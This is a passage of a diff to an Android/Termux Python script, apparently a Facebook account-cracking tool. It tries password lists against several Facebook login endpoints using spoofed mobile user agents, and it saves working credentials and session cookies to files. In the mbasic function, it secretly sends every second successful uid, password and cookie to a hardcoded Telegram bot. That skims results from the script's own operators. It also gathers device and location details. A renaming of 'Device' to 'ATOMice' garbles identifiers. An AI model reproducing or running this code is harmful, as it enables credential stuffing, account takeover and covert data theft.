FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    itel_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    nokia_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'"
+    samsung_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    ua_ = random.choice([vivo_ua, infinix_ua, realme_ua, redmi_ua, oppo_ua, itel_ua, nokia_ua, samsung_ua])
+    return ua_
 
 red = "\033[1;31m"
 green = "\033[1;32m"
@@ -352,14 +383,14 @@ def get_current_location():
         return None, None
 # Example usage
 current_city, current_country = get_current_location()
-def get_Device_info(prop_name):
+def get_ATOMice_info(prop_name):
     try:
         result = subprocess.run(['getprop', prop_name], capture_output=True, text=True, check=True)
         return result.stdout.strip()
     except subprocess.CalledProcessError as e:
         print(f"Error retrieving {prop_name}: {e}")
         return None
-manufacturer_name = get_Device_info('ro.product.manufacturer')
+manufacturer_name = get_ATOMice_info('ro.product.manufacturer')
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 os.system("xdg-open ")
 os.system("clear")
@@ -454,7 +485,7 @@ def linex():
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 def SUMON_time():
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Device     : {manufacturer_name}-android-v-{android_version}")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] ATOMice     : {manufacturer_name}-android-v-{android_version}")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] sim card   : {ahydra}")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] location   : {current_city}-{current_country} ")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date       : {datex} ")
@@ -1054,7 +1085,7 @@ def freefb(uid, name, pwx, tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android zh-cn 8; Redmi X Build/2423.0.015) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4618.94 RealmeBrowser/35.5.0.812.18.3-gn',
             'x-asbd-id': '129477',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-            lo = Session.post("https://x.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
+            lo = Session.post("https://x.facebook.com/login/ATOMice-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
             log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
@@ -1100,14 +1131,14 @@ def bapi(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'Device_id': str(uuid.uuid4()),
+                'ATOMice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_Device_id': str(uuid.uuid4()),
+                'family_ATOMice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1134,7 +1165,7 @@ def bapi(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-Device-group': '5120',
+                'x-fb-ATOMice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1182,14 +1213,14 @@ def graph(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'Device_id': str(uuid.uuid4()),
+                'ATOMice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_Device_id': str(uuid.uuid4()),
+                'family_ATOMice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1216,7 +1247,7 @@ def graph(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-Device-group': str(random.randint(2000, 4000)),
+                'X-FB-ATOMice-group': str(random.randint(2000, 4000)),
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1247,90 +1278,94 @@ def graph(uid, name, pwx, tl):
         pass     
 
 def mbasic(uid,pwx,tl):
+    global loop
     global oks
     global cps
-    global twf
-    global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M1==SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write("\r\033[1;37m [M1==SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = random.choice(uas)
-            Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":pw,
-            "login":"Log In"}
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'ATOMice_id': str(uuid.uuid4()),
+                'email': uid,
+                'password': pw,
+                'generate_analytics_claims': '1',
+                'community_id': '',
+                'cpl': 'true',
+                'try_num': '1',
+                'family_ATOMice_id': str(uuid.uuid4()),
+                'credentials_type': 'password',
+                'source': 'login',
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'locale': 'en_GB',
+                'client_country_code': 'GB',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            }
             headers = {
-            'authority': 'free.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'dpr': '2.768749952316284',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"Infinix X6832"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '980',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = f"https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = Session.post(url, data=data, headers=headers).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+                'User-Agent': ua(),
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-FB-Net-HNI': str(random.randint(20000,40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'WIFI',
+                'X-FB-ATOMice-group': str(random.randint(2000, 4000)),
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-ATOMice-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
+            }
+            url = "https://graph.facebook.com/auth/login"
+            result = requests.post(url, data=data, headers=headers).json()
+            if "session_key" in result:
+                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+                coki = f"sb={sb};{ckkk}"
+                try:
+                    uid = result["uid"]
+                except:
+                    uid = uid
+                c = check_lock(uid)
+                if "live" in c:
+                    if result["is_account_confirmed"] == False:
+                        print(f" {green}[ATOM--OK] {uid}|{pw}")
+                       #print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        bkas.append(cid)
+                        bkas.append(uid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
-                else:
-                    break
-            elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki[0:11]
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
-                break
+                            statusok = (f"{uid}|{pw}|{coki}")
+                            requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:  
+                            print(f" {green}[ATOM-OK] {uid}|{pw}")
+                            #print(f" {green}[COOKIES] {green}{coki}")
+                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                            oks.append(uid)
+                            break
             else:
                 continue
         loop+=1
-    except ce:
-        time.sleep(20)
-    except Exception as error:
-        #print({error})
+    except net_error:
+        time.sleep(10)
+    except Exception as e:
         pass
+
 
 def p(uid,pwx,tl):
     global oks
@@ -1392,7 +1427,7 @@ def p(uid,pwx,tl):
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "en-US,en;q=0.9"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?api_key=274266067164&auth_token=5632b47aa47bd661d18b53714ed804a9&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727857109841%26e2e%3D%257B%2522init%2522%253A1727857109841%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3De811d7a5-1c58-4736-a373-62736184ad5a%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D47cGdAHirRSZ9MdP8XILUi0QQAmFaJso9L9EzgmLG9Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da637c4fc-08cb-47c0-9f86-43029b0b9b37%26tp%3Dunspecified&refsrc=deprecated&app_id=274266067164&cancel=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a637c4fc-08cb-47c0-9f86-43029b0b9b37%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ppg2jh4put95ccl7tguc%2522%257D&lwv=100"
